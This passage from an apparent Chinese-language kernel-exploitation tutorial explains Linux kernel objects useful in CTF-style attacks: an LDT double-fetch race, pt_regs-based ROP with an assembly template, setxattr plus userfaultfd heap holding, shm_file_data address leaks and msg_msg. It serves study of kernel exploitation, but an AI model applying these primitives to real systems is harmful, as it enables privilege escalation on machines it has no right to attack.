class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">write_ldt</span><span class="hljs-params">(<span class="hljs-type">void</span> __user *ptr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bytecount, <span class="hljs-type">int</span> oldmode)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    old_ldt       = mm-&gt;context.ldt;<br>    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="hljs-number">0</span>;<br>    new_nr_entries = max(ldt_info.entry_number + <span class="hljs-number">1</span>, old_nr_entries);<br><br>    error = -ENOMEM;<br>    new_ldt = alloc_ldt_struct(new_nr_entries);<br>    <span class="hljs-keyword">if</span> (!new_ldt)<br>        <span class="hljs-keyword">goto</span> out_unlock;<br><br>    <span class="hljs-keyword">if</span> (old_ldt)<br>        <span class="hljs-built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);<br><br>    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;<br><br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p> 我们可以看到的是，在 memcpy 时所拷贝的字节数为 <code>old_ldt-&gt;nr_entries * LDT_ENTRY_SIZE</code>，其中前者的上限值与后者都定义于 <code>arch/x86/include/uapi/asm/ldt.h</code> 中，如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Maximum number of LDT entries supported. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LDT_ENTRIES    8192</span><br><span class="hljs-comment">/* The size of each LDT entry. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LDT_ENTRY_SIZE    8</span><br></code></pre></td></tr></table></figure><p> 那么这个数据量相对较大，拷贝需要用到一定的时间，而在拷贝结束后有一句 <code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt</code>，其中 ldt 为我们传入的数据，我们不难想到的是<strong>可以通过条件竞争的方式在 memcpy 过程中将 new_ldt-&gt;entries 更改为我们的目标地址从而完成任意地址写</strong>，即 double fetch </p><h1 id="0x04-pt-regs-与系统调用相关"><a href="#0x04-pt-regs-与系统调用相关" class="headerlink" title="0x04.pt_regs 与系统调用相关"></a>0x04.pt_regs 与系统调用相关</h1><p>严格意义上而言，<code>pt_regs</code> 并非是通过 slub 分配而来的一个结构体，而是<strong>固定位于内核栈底的一个结构体</strong>，由于其上的数据对我们而言是部分可控的，因此该结构体在内核利用当中也能发挥相当的作用</p><h2 id="系统调用部分过程-与-pt-regs-结构体"><a href="#系统调用部分过程-与-pt-regs-结构体" class="headerlink" title="系统调用部分过程 与 pt_regs 结构体"></a>系统调用部分过程 与 pt_regs 结构体</h2><p>系统调用的本质是什么？或许不少人都能够答得上来是由我们在用户态布置好相应的参数后执行 <code>syscall</code> 这一汇编指令，通过门结构进入到内核中的 <code>entry_SYSCALL_64</code>这一函数，随后通过系统调用表跳转到对应的函数</p><p>现在让我们将目光放到 <code>entry_SYSCALL_64</code> 这一用汇编写的函数内部，观察，我们不难发现其有着<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/entry_64.S#L107">这样一条指令</a>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">PUSH_AND_CLEAR_REGS <span class="hljs-attribute">rax</span>=$-ENOSYSCopy<br></code></pre></td></tr></table></figure><p>这是一条十分有趣的指令，它会将所有的寄存器<strong>压入内核栈上，形成一个 pt_regs 结构体</strong>，该结构体实质上位于内核栈底：</p><p><a href="https://i.loli.net/2021/11/14/NwjgEMse8cTCdLr.png"><img src="https://i.loli.net/2021/11/14/NwjgEMse8cTCdLr.png" alt="image.png"></a></p><p>该结构体的<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44">定义</a>如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pt_regs</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span><br><span class="hljs-comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r15;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r14;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r13;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r12;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbx;<br><span class="hljs-comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r11;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r10;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r9;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r8;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rax;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rcx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsi;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdi;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span><br><span class="hljs-comment"> * On hw interrupt, it&#x27;s IRQ number:</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> orig_rax;<br><span class="hljs-comment">/* Return frame for iretq */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rip;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cs;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ss;<br><span class="hljs-comment">/* top of stack page */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="内核栈-与-通用-ROP"><a href="#内核栈-与-通用-ROP" class="headerlink" title="内核栈 与 通用 ROP"></a>内核栈 与 通用 ROP</h2><p>我们都知道，内核栈<strong>只有一个页面的大小</strong>，而 pt_regs 结构体则固定位于<strong>内核栈栈底</strong>，当我们劫持内核结构体中的某个函数指针时（例如 seq_operations-&gt;start），在我们通过该函数指针劫持内核执行流时 <strong>rsp 与 栈底的相对偏移通常是不变的</strong></p><p>而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15，<strong>这些寄存器为我们布置 ROP 链提供了可能，我们不难想到：</strong></p><ul><li><strong>只需要寻找到一条形如 “add rsp, val ; ret” 的 gadget 便能够完成 ROP</strong></li></ul><blockquote><p>这是一个方便进行调试的板子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__asm__(<br>    <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>    <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>    <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>    <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>    <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>    <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>    <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>    <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>    <span class="hljs-string">&quot;mov r9,    0x88888888;&quot;</span><br>    <span class="hljs-string">&quot;mov r8,    0x99999999;&quot;</span><br>    <span class="hljs-string">&quot;xor rax,   rax;&quot;</span><br>    <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>    <span class="hljs-string">&quot;mov rdx,   8;&quot;</span><br>    <span class="hljs-string">&quot;mov rsi,   rsp;&quot;</span><br>    <span class="hljs-string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="hljs-comment">// 这里假定通过 seq_operations-&gt;stat 来触发</span><br>    <span class="hljs-string">&quot;syscall&quot;</span><br>);<br></code></pre></td></tr></table></figure></blockquote><p>例题：<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E4%BE%8B%E9%A2%98%EF%BC%9A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B-easykernel">西湖论剑 2021 线上初赛 - easykernel</a></p><h3 id="新版本内核对抗利用-pt-regs-进行攻击的办法"><a href="#新版本内核对抗利用-pt-regs-进行攻击的办法" class="headerlink" title="新版本内核对抗利用 pt_regs 进行攻击的办法"></a>新版本内核对抗利用 pt_regs 进行攻击的办法</h3><p>正所谓魔高一尺道高一丈，内核主线在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14">这个 commit</a> 中为系统调用栈<strong>添加了一个偏移值，这意味着 pt_regs 与我们触发劫持内核执行流时的栈间偏移值不再是固定值</strong></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c</span><br><span class="hljs-comment">index 4efd39aacb9f2..7b2542b13ebd9 100644</span><br><span class="hljs-comment">--- a/arch/x86/entry/common.c</span><br><span class="hljs-comment">+++ b/arch/x86/entry/common.c</span><br><span class="hljs-meta">@@ -38,6 +38,7 @@</span><br> #ifdef CONFIG_X86_64<br> __visible noinstr void do_syscall_64(unsigned long nr, struct pt_regs *regs)<br> &#123;<br><span class="hljs-addition">+add_random_kstack_offset();</span><br> nr = syscall_enter_from_user_mode(regs, nr);<br> <br> instrumentation_begin();<br></code></pre></td></tr></table></figure><p>当然，若是在这个随机偏移值较小且我们仍有足够多的寄存器可用的情况下，仍然可以通过布置一些 slide gadget 来继续完成利用，不过稳定性也大幅下降了， <em>可以说这种利用方式基本上是废了</em></p><h1 id="0x05-setxattr-相关"><a href="#0x05-setxattr-相关" class="headerlink" title="0x05.setxattr 相关"></a>0x05.setxattr 相关</h1><p><strong>setxattr</strong> 并非一个内核结构体，而是一个系统调用，但在 kernel pwn 当中这同样是一个十分有用的系统调用，利用这个系统调用，我们可以进行内核空间中任意大小的 object 的分配，<strong>通常需要配合 userfaultfd 系统调用</strong>完成进一步的利用</p><h2 id="任意大小-object-分配（GFP-KERNEL）-amp-释放"><a href="#任意大小-object-分配（GFP-KERNEL）-amp-释放" class="headerlink" title="任意大小 object 分配（GFP_KERNEL）&amp; 释放"></a>任意大小 object 分配（GFP_KERNEL）&amp; 释放</h2><p>观察 setxattr 源码，发现如下调用链：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">SYS_setxattr</span>()</span><br>    <span class="hljs-function"><span class="hljs-title">path_setxattr</span>()</span><br>        <span class="hljs-function"><span class="hljs-title">setxattr</span>()</span><br></code></pre></td></tr></table></figure><p>在 <code>setxattr()</code> 函数中有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">setxattr</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dentry *d, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *name, <span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *value,</span><br><span class="hljs-params">     <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>        kvalue = kvmalloc(size, GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!kvalue)<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        <span class="hljs-keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;<br><br>    <span class="hljs-comment">//,..</span><br><br>    kvfree(kvalue);<br><br>    <span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 value 和 size 都是由我们来指定的，即<strong>我们可以分配任意大小的 object 并向其中写入内容</strong></p><h2 id="setxattr-userfaultfd-堆占位技术"><a href="#setxattr-userfaultfd-堆占位技术" class="headerlink" title="setxattr + userfaultfd 堆占位技术"></a>setxattr + userfaultfd 堆占位技术</h2><p>但是该 object 在 setxattr 执行结束时又会被放回 freelist 中，设想若是我们需要劫持该 object 的前 8 字节，那将前功尽弃</p><p>重新考虑 setxattr 的执行流程，其中会调用 <code>copy_from_user</code> 从用户空间拷贝数据，那么让我们考虑如下场景：</p><p>我们通过 mmap 分配连续的两个页面，在第二个页面上启用 userfaultfd，并在第一个页面的末尾写入我们想要的数据，此时我们调用 setxattr 进行<strong>跨页面的拷贝</strong>，当 copy_from_user 拷贝到第二个页面时<strong>便会触发 userfaultfd，从而让 setxattr 的执行流程卡在此处，这样这个 object 就不会被释放掉，而是可以继续参与我们接下来的利用</strong></p><p><img src="https://i.loli.net/2021/11/28/vBgSsTLRf5ZdYaJ.png" alt="image.png"></p><p>这便是 setxattr + userfaultfd 结合的堆占位技术（例题：<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E4%BE%8B%E9%A2%98%EF%BC%9ASECCON-2020-kstack">SECCON 2020 kstack</a>）</p><h1 id="0x06-shm-file-data-与共享内存相关"><a href="#0x06-shm-file-data-与共享内存相关" class="headerlink" title="0x06.shm_file_data 与共享内存相关"></a>0x06.shm_file_data 与共享内存相关</h1><p><strong>进程间通信</strong>（Inter-Process Communication，IPC）即不同进程间的数据传递问题，在 Linux 当中有一种 IPC 技术名为<strong>共享内存</strong>，在用户态中我们可以通过 <code>shmget</code>、<code>shmat</code>、<code>shmctl</code>、<code>shmdt</code> 这四个系统调用操纵共享内存</p><h2 id="shm-file-data（kmalloc-32-GFP-KERNEL）"><a href="#shm-file-data（kmalloc-32-GFP-KERNEL）" class="headerlink" title="shm_file_data（kmalloc-32|GFP_KERNEL）"></a>shm_file_data（kmalloc-32|GFP_KERNEL）</h2><p>该结构体定义于 <code>/ipc/shm.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> &#123;</span><br>    <span class="hljs-type">int</span> id;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span> *<span class="hljs-title">vm_ops</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="分配：shmat-系统调用"><a href="#分配：shmat-系统调用" class="headerlink" title="分配：shmat 系统调用"></a>分配：shmat 系统调用</h3><p>我们知道使用 <code>shmget</code> 系统调用可以获得一个共享内存对象，随后要使用 <code>shmat</code> 系统调用将共享内存对象映射到进程的地址空间，在该系统调用中调用了 <code>do_shmat()</code> 函数，注意到如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">do_shmat</span><span class="hljs-params">(<span class="hljs-type">int</span> shmid, <span class="hljs-type">char</span> __user *shmaddr, <span class="hljs-type">int</span> shmflg,</span><br><span class="hljs-params">          ulong *raddr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> shmlba)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> *<span class="hljs-title">sfd</span>;</span><br><br><span class="hljs-comment">//...</span><br><br>    sfd = kzalloc(<span class="hljs-keyword">sizeof</span>(*sfd), GFP_KERNEL);<br><span class="hljs-comment">//...</span><br>    file-&gt;private_data = sfd;<br></code></pre></td></tr></table></figure><p>即在调用 <code>shmat</code> 系统调用时会创建一个 <code>shm_file_data</code> 结构体，最后会存放在共享内存对象文件的 private_data 域中</p><h3 id="释放：shmdt-系统调用"><a href="#释放：shmdt-系统调用" class="headerlink" title="释放：shmdt 系统调用"></a>释放：shmdt 系统调用</h3><p>我们知道使用 <code>shmdt</code> 系统调用用以断开与共享内存对象的连接，观察其源码，发现其会调用 <code>ksys_shmdt()</code> 函数，注意到如下调用链：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">SYS_shmdt</span>()</span><br>    <span class="hljs-function"><span class="hljs-title">ksys_shmdt</span>()</span><br>        <span class="hljs-function"><span class="hljs-title">do_munmap</span>()</span><br>            <span class="hljs-function"><span class="hljs-title">remove_vma_list</span>()</span><br>                <span class="hljs-function"><span class="hljs-title">remove_vma</span>()</span><br></code></pre></td></tr></table></figure><p>其中有着这样一条代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> vm_area_struct *<span class="hljs-title function_">remove_vma</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">next</span> =</span> vma-&gt;vm_next;<br><br>    might_sleep();<br>    <span class="hljs-keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;close)<br>        vma-&gt;vm_ops-&gt;close(vma);<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>在这里调用了该 vma 的 vm_ops 对应的 close 函数，我们将目光重新放回共享内存对应的 vma 的初始化的流程当中，在 shmat() 中注意到如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">do_shmat</span><span class="hljs-params">(<span class="hljs-type">int</span> shmid, <span class="hljs-type">char</span> __user *shmaddr, <span class="hljs-type">int</span> shmflg,</span><br><span class="hljs-params">          ulong *raddr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> shmlba)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>sfd = kzalloc(<span class="hljs-keyword">sizeof</span>(*sfd), GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (!sfd) &#123;<br>        fput(base);<br>        <span class="hljs-keyword">goto</span> out_nattch;<br>    &#125;<br><br>    file = alloc_file_clone(base, f_flags,<br>              is_file_hugepages(base) ?<br>                &amp;shm_file_operations_huge :<br>                &amp;shm_file_operations);<br></code></pre></td></tr></table></figure><p>在这里调用了 <code>alloc_file_clone()</code> 函数，其会调用 <code>alloc_file()</code> 函数将第三个参数赋值给新的 file 结构体的 f_op 域，在这里是 <code>shm_file_operations</code> 或 <code>shm_file_operations_huge</code>，定义于 <code>/ipc/shm.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">shm_file_operations</span> =</span> &#123;<br>    .mmap        = shm_mmap,<br>    .fsync        = shm_fsync,<br>    .release    = shm_release,<br>    .get_unmapped_area    = shm_get_unmapped_area,<br>    .llseek        = noop_llseek,<br>    .fallocate    = shm_fallocate,<br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * shm_file_operations_huge is now identical to shm_file_operations,</span><br><span class="hljs-comment"> * but we keep it distinct for the sake of is_file_shm_hugepages().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">shm_file_operations_huge</span> =</span> &#123;<br>    .mmap        = shm_mmap,<br>    .fsync        = shm_fsync,<br>    .release    = shm_release,<br>    .get_unmapped_area    = shm_get_unmapped_area,<br>    .llseek        = noop_llseek,<br>    .fallocate    = shm_fallocate,<br>&#125;;<br></code></pre></td></tr></table></figure><p>在这里对于关闭 shm 文件，对应的是 <code>shm_release</code> 函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">shm_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *ino, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> *<span class="hljs-title">sfd</span> =</span> shm_file_data(file);<br><br>    put_ipc_ns(sfd-&gt;ns);<br>    fput(sfd-&gt;file);<br>    shm_file_data(file) = <span class="hljs-literal">NULL</span>;<br>    kfree(sfd);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>即当我们进行 shmdt 系统调用时便可以释放 <code>shm_file_data</code> 结构体</p><h3 id="数据泄露-2"><a href="#数据泄露-2" class="headerlink" title="数据泄露"></a>数据泄露</h3><h4 id="内核-text-段地址-2"><a href="#内核-text-段地址-2" class="headerlink" title="内核 .text 段地址"></a>内核 .text 段地址</h4><p>shm_file_data 的 ns 域 和 vm_ops 域皆指向内核的 .text 段中，若是我们能够泄露这两个指针便能获取到内核 .text 段基址，其中 ns 字段通常指向 <code>init_ipc_ns</code></p><h4 id="内核线性映射区（-direct-mapping-area）-1"><a href="#内核线性映射区（-direct-mapping-area）-1" class="headerlink" title="*内核线性映射区（ direct mapping area）"></a><em>*内核线性映射区（ direct mapping area）</em></h4><p>shm_file_data 的 file 域为一个 file 结构体，位于线性映射区中，若能泄露 file 域则同样能泄漏出内核的“堆上地址”</p><h1 id="0x07-system-V-消息队列：内核中的“菜单堆”"><a href="#0x07-system-V-消息队列：内核中的“菜单堆”" class="headerlink" title="0x07.system V 消息队列：内核中的“菜单堆”"></a>0x07.system V 消息队列：内核中的“菜单堆”</h1><p>在 Linux kernel 中有着一组 system V 消息队列相关的系统调用：</p><ul><li>msgget：创建一个消息队列</li><li>msgsnd：向指定消息队列发送消息</li><li>msgrcv：从指定消息队列接接收消息</li></ul><p>当我们创建一个消息队列时，在内核空间中会创建一个 <code>msg_queue</code> 结构体，其表示一个消息队列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msq_queue structure for each present queue on the system */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kern_ipc_perm</span> <span class="hljs-title">q_perm</span>;</span><br><span class="hljs-type">time64_t</span> q_stime;<span class="hljs-comment">/* last msgsnd time */</span><br><span class="hljs-type">time64_t</span> q_rtime;<span class="hljs-comment">/* last msgrcv time */</span><br><span class="hljs-type">time64_t</span> q_ctime;<span class="hljs-comment">/* last change time */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_cbytes;<span class="hljs-comment">/* current number of bytes on queue */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qnum;<span class="hljs-comment">/* number of messages in queue */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qbytes;<span class="hljs-comment">/* max number of bytes on queue */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lspid</span>;</span><span class="hljs-comment">/* pid of last msgsnd */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lrpid</span>;</span><span class="hljs-comment">/* last receive pid */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_messages</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_receivers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_senders</span>;</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><h2 id="msg-msg-amp-msg-msgseg：近乎任意大小的对象分配"><a href="#msg-msg-amp-msg-msgseg：近乎任意大小的对象分配" class="headerlink" title="msg_msg &amp; msg_msgseg：近乎任意大小的对象分配"></a>msg_msg &amp; msg_msgseg：近乎任意大小的对象分配</h2><p>当我们调用 msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，在内核空间中会创建这样一个结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 